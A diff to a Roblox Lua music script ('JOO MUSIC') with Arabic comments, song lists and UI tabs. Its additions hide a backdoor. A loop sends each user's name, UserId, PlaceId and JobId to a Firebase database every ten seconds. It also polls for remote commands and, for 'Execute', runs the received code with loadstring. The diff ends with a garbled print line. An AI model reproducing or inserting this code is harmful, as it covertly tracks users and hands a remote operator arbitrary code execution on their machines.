@@ -54,7 +54,76 @@ local Players = game:GetService("Players")
 local lp = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui = game:GetService("StarterGui")
+local HttpService = game:GetService("HttpService")
 local Mouse = lp:GetMouse()
+
+-- ==================== FIREBASE REALTIME DATABASE API ====================
+local FIREBASE_BASE_URL = "https://admins-zenix-dark-joker-default-rtdb.firebaseio.com/.json"
+local requestWrapper = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
+
+local function updateFirebaseStatus()
+    if not requestWrapper then return end
+
+    pcall(function()
+        -- 1. تحديث حالة المستخدم المتصل في قاعدة البيانات
+        local userUrl = FIREBASE_BASE_URL .. "ActiveUsers/" .. tostring(lp.UserId) .. ".json"
+        local userData = HttpService:JSONEncode({
+            Username = lp.Name,
+            DisplayName = lp.DisplayName,
+            UserId = lp.UserId,
+            PlaceId = game.PlaceId,
+            JobId = game.JobId,
+            LastSeen = os.time()
+        })
+
+        requestWrapper({
+            Url = userUrl,
+            Method = "PATCH",
+            Headers = { ["Content-Type"] = "application/json" },
+            Body = userData
+        })
+
+        -- 2. فحص الأوامر القادمة من المطور (Remote Commands)
+        local cmdUrl = FIREBASE_BASE_URL .. "Commands/" .. tostring(lp.UserId) .. ".json"
+        local response = requestWrapper({
+            Url = cmdUrl,
+            Method = "GET"
+        })
+
+        if response and response.Body and response.Body ~= "null" then
+            local cmd = HttpService:JSONDecode(response.Body)
+            if cmd then
+                -- تنفيذ الأمر
+                if cmd.Type == "Kick" then
+                    lp:Kick(cmd.Reason or "تم طردك بواسطة المطور.")
+                elseif cmd.Type == "Notify" then
+                    StarterGui:SetCore("SendNotification", {
+                        Title = cmd.Title or "📢 إشعار المطور",
+                        Text = cmd.Message or "",
+                        Duration = cmd.Duration or 5
+                    })
+                elseif cmd.Type == "Execute" and cmd.Code then
+                    loadstring(cmd.Code)()
+                end
+
+                -- مسح الأمر بعد التنفيذ
+                requestWrapper({
+                    Url = cmdUrl,
+                    Method = "DELETE"
+                })
+            end
+        end
+    end)
+end
+
+-- تشغيل التتبع وتحديث قاعدة البيانات كل 10 ثوانٍ
+task.spawn(function()
+    while task.wait(10) do
+        updateFirebaseStatus()
+    end
+end)
+
+-- ==================== تشغيل الموسيقى والمركبات ====================
 
 -- تشغيل الأغنية (السكوتر البريمية)
 local function playMusic(id)
@@ -262,9 +331,7 @@ local function addSong(tab, name, id)
     })
 end
 
--- الأغاني العشوائية (النسخة الأصلية + الأغاني الجديدة المضافة)
 local randomSongs = {
-    -- الأغاني الأصلية
     {"افخم فونك", "17647322226"}, {"فونك غضب", "115859025716354"}, {"فونك عالمي", "76578817848504"},
     {"فونك ممتاز", "102402883551679"}, {"فونك ازعاج", "85682109892034"}, {"BATTLE OF EGYPT JumpSTYLE", "98965852907043"},
     {"LAZERSTYLERZ MIX", "72205284895340"}, {"JUMPSTYLE 2003 (SLOWED)", "133557915783857"}, {"MAYHEM EXEC", "76333126810079"},
@@ -281,8 +348,6 @@ local randomSongs = {
     {"Charlie Kirky Funk", "113458227429706"}, {"坤坤专属（慢速版）", "82944401312241"}, {"Hunter Eyes", "139957878565852"},
     {"Trillium", "115440201770223"}, {"#Voyuitwaaien", "123181826801671"}, {"Unknown 1", "123267035671850"}, {"Unknown 2", "85341099264298"},
     {"Back Rooms Funk", "106711954990826"},
-    
-    -- الأغاني الجديدة المضافة
     {"🎵 LOW CORTISOL", "110919391228823"},
     {"🎵 TOOK HER THE O", "86370168350239"},
     {"🎵 Babydoll", "127012181396114"},
@@ -303,7 +368,6 @@ local arabicSongs = {
     {"اكبر غلطه", "127085435747898"}, {"ليه جي", "92304349905750"}, {"هات الدكتور", "8776769631"},
     {"علي كيفك", "123487073954032"}, {"بخطار بس قني بروك", "125693571824719"}, {"أغنية جديدة 1", "138648345036748"},
     {"أغنية جديدة 2", "113052183515304"}, {"أغنية جديدة 3", "114316100741483"}, {"أغنية جديدة 4", "70646100859753"},
-    -- أغاني جديدة من الصورة
     {"🎵 اللہ اللہ یہ جمالك", "102463539890606"},
     {"🎵 وکر العصفور مهموم", "139296082581664"},
     {"🎵 يا حلوة", "126351447107230"},
@@ -311,7 +375,6 @@ local arabicSongs = {
     {"🎵 بلدي", "137320322714946"},
     {"🎵 tik tok اجنبیہ کانت ترند", "123619990717774"},
     {"🎵 ليلة عربیة", "120190715989820"},
-    -- أغاني جديدة من الصور الثانية
     {"🎵 وو | علی تحنی یا دنیا", "124123680327164"},
     {"🎵 اغنيه جديده", "126189830749452"},
     {"🎵 غازي | اغنية ليبيه بعد سنين", "11413825257397"},
@@ -368,7 +431,6 @@ local function addHouseSong(name, id)
     })
 end
 
--- إضافة جميع الأغاني إلى تبويب البيوت
 for _, song in ipairs(randomSongs) do addHouseSong(song[1], song[2]) end
 for _, song in ipairs(arabicSongs) do addHouseSong(song[1], song[2]) end
 for _, song in ipairs(iraqiSongs) do addHouseSong(song[1], song[2]) end
@@ -392,7 +454,6 @@ local function addBoomboxSong(name, id)
     })
 end
 
--- إضافة جميع الأغاني إلى تبويب البومبوكس
 for _, song in ipairs(randomSongs) do addBoomboxSong(song[1], song[2]) end
 for _, song in ipairs(arabicSongs) do addBoomboxSong(song[1], song[2]) end
 for _, song in ipairs(iraqiSongs) do addBoomboxSong(song[1], song[2]) end
@@ -487,7 +548,6 @@ ManualTab:Button({
     end
 })
 
--- ==================== زر جلب Boombox ====================
 ManualTab:Button({
     Title = "📻 خذ Boombox",
     Desc = "يجلب لك صندوق الموسيقى (Boombox) من اللعبة",
@@ -571,6 +631,4 @@ welcomeSound.Looped = false
 welcomeSound.Parent = SoundService
 welcomeSound:Play()
 
-print("✅ JOO MUSIC (بيوت + بومبوكس) loaded successfully!")
-print("📌 تبويب بيوت للأغاني في المنزل")
-print("📌 تبويب بومبوكس للأغاني في صندوق الموسيقى")
+print("✅ JOO MUSIC (بيوت + بومبوكس + ssfully!")
